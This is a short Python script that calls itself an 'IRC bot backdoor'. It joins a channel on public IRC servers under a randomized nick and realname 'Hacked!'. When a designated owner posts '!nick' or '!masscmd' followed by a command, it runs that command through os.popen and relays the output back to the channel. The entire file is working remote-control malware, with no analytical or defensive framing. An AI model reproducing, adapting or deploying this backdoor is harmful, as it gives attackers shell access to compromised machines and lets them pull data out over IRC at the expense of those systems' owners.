#!/usr/bin/env python
#IRC bot backdoor.
import random
import ircbot
import time
import sys
import os

owner = ""
channel = "#"
nick = "own"
servers = [("irc.inter.net.il",6668),("irc.he.net",6668)]

class MyBot ( ircbot.SingleServerIRCBot ):
	"""Creates an IRC bot that accepts commands through 
	a channel. Either !nick or !masscmd can be used.

	Returns None"""
	def on_welcome ( self, connection, event ):
		connection.join (channel)
	def on_pubmsg ( self, connection, event ):
		source = event.source().split ( '!' ) [ 0 ]
		if owner in source:			
			if "!" + nick in event.arguments() [0]:
				a = "".join(event.arguments())
				a = a.split("!" + nick)
				cmd = a[1]
				resp = os.popen(cmd).readlines()
				for elem in resp:
					elem.rstrip()
					time.sleep(1)
					connection.privmsg(channel,elem)
			if "!masscmd" in event.arguments() [0]:
                                a = "".join(event.arguments())
                                a = a.split("!masscmd ")
                                cmd = a[1]
                                resp = os.popen(cmd).readlines()
                                for elem in resp:
                                        elem.rstrip()
                                        time.sleep(1)
                                        connection.privmsg(channel,elem)	

if __name__ == "__main__":
	channel = channel + sys.argv[1]
	owner = sys.argv[2]
	for i in random.sample('abcdefghijklmnopqrstuvwxyz',4):
		nick+=i
	bot = MyBot (servers,nick,"Hacked!")
	bot.start()
